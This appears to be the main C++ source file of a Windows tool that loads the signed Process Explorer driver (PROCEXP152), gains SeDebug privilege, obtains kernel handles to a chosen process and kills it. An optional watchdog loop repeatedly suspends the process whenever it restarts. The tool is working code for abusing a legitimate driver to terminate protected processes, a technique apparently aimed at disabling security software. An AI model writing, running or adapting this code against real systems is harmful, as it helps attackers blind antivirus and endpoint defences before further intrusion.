#include "Utils.h"
#include "Driver.h"
#include "Service.h"

int main(int argc, char** argv)
{

	bool help1 = cmdParamExists(argv, argv + argc, "/h");
	bool help2 = cmdParamExists(argv, argv + argc, "/help");
	bool help3 = cmdParamExists(argv, argv + argc, "-h");
	bool help4 = cmdParamExists(argv, argv + argc, "--h");
	bool help5 = cmdParamExists(argv, argv + argc, "--help");
	bool help6 = cmdParamExists(argv, argv + argc, "/?");
	bool help7 = cmdParamExists(argv, argv + argc, "-?");

	if (argc <= 1 || help1 || help2 || help3 || help4 || help5 || help6 || help7)
		print_help();


	/* Initalize args */

	BOOL bService = cmdParamExists(argv, argv + argc, "/service");	// The Service Name
	BOOL bInstall = cmdParamExists(argv, argv + argc, "/install");	// The driver file path
	BOOL bPid = cmdParamExists(argv, argv + argc, "/pid");			// the PID of the process to kill
	BOOL bName = cmdParamExists(argv, argv + argc, "/name");		// The name of the process to kill
	BOOL watchdog = cmdParamExists(argv, argv + argc, "/watchdog") ? TRUE : FALSE;


	if (!bInstall && !bService) {
		printf("[-] Must supply either /install or /service\n");
		return 0;
	}
	if (!bPid && !bName) {
		printf("[-] Must supply Process Id (/pid) or Process Name (/name)\n");
		return 0;
	}

	LPCSTR DRIVER_PATH = bInstall ? getCmdParam(argv, argv + argc, "/install") : NULL;
	LPCSTR SERVICE_NAME = bService ? getCmdParam(argv, argv + argc, "/service") : "PROCEXP152";

	WCHAR* procName = { 0 };
	ULONG PID = 0;
	
	if (bName)
	{
		char* _procname = getCmdParam(argv, argv + argc, "/name");
		int nChars = MultiByteToWideChar(CP_ACP, 0, _procname, -1, NULL, 0);
		procName = new WCHAR[nChars];
		MultiByteToWideChar(CP_ACP, 0, _procname, -1, (LPWSTR)procName, nChars);

		PID = getProcessIdByName(procName);
		if (PID == 0) {
			printf("[-] Failed to find Process ID by given name\n");
			return 1;
		}
	}
	else if(bPid)
	{
		PID = strtoul(getCmdParam(argv, argv + argc, "/pid"), 0, 10);
		if (!getProcessNameById(PID, procName)) {
			printf("[-] Failed to find Process Name by given PID\n");
			return 1;
		}
	}
	printf("[!] Targeting Process: %ws (PID: %lu)\n", procName, PID);

	// If we install, install and start else just try to start 
	Service service{ SERVICE_NAME, DRIVER_PATH };
	if (bInstall) 
	{
		FILE* file_exists = fopen(DRIVER_PATH, "r");
		if (!file_exists) {
			printf("[-] File \"%s\" doesn't exists or no read permissions\n", DRIVER_PATH);
			return 0;
		}
		fclose(file_exists);
		
		if (!service.create_service()) {
			return 0;
		}
	}
	else
	{
		if (!service.start_service())
			return 0;
	}
	
	if (!SetDebugPrivilege())
		return 1;
	printf("[+] SeDebug Enabled\n");

	HANDLE hDriver, hProc = NULL;
	
	hDriver = CreateFileA("\\\\.\\PROCEXP152", GENERIC_ALL, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to get handle to driver. (Error Code: %i)\n", GetLastError());
		return 0;
	}
	printf("[+] Got handle to driver\n");


	hProc = open_handle((ULONGLONG)PID, hDriver);
	if (hProc == NULL) {
		printf("[!] Failed to get handle for \"%ws\". (Error Code: %i)\n", procName, GetLastError());
		CloseHandle(hDriver);
		return 1;
	}
	printf("[+] Got handle to \"%ws\"\n", procName);

	
	if (!watchdog) {
		printf("[!] Watchdog Disabled\n");
		kill(hDriver, hProc, (ULONGLONG)PID);
		CloseHandle(hProc);
		CloseHandle(hDriver);
		return 0;
	}
	

	// Apply watchdog
	printf("[+] Watchdog Enabled\n");
	
	BOOL killed = kill(hDriver, hProc, (ULONGLONG)PID);
	if (!killed) {
		printf("[!] Failed to close all handles for the process\n");
		CloseHandle(hProc);
		CloseHandle(hDriver);
		return 1;
	}

	/* 
	 * First loop to detect when the process completely dies after closing all handles
	 * Second loop to detect when process is up again and suspending it
	*/

	fNtSuspendProcess NtSuspendProcess = (fNtSuspendProcess)GetProcAddress(GetModuleHandle(L"ntdll"), "NtSuspendProcess");
	DWORD trackPID = 0;
	
	// Check if we need kernel mode handle or we can use user mode handle
	BOOL userMode = FALSE;
	HANDLE _hPid = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, PID);
	if (_hPid != INVALID_HANDLE_VALUE || GetLastError() != ERROR_ACCESS_DENIED) {
		userMode = TRUE;
		CloseHandle(_hPid);
	}
	
	printf("[!] Starting Watchdog...\n\n");
	while (true)
	{
		trackPID = getProcessIdByName(procName);

		if (trackPID == PID || trackPID == 0) 
			continue;

		if (trackPID != 0) {
			PID = trackPID;

			hProc = userMode ? OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, PID) : open_handle(ULONGLONG(PID), hDriver);
			NtSuspendProcess(hProc);
			CloseHandle(hProc);
			printf("[+] Caught %ws (PID: %lu)\n", procName, PID);
		}
	}
}
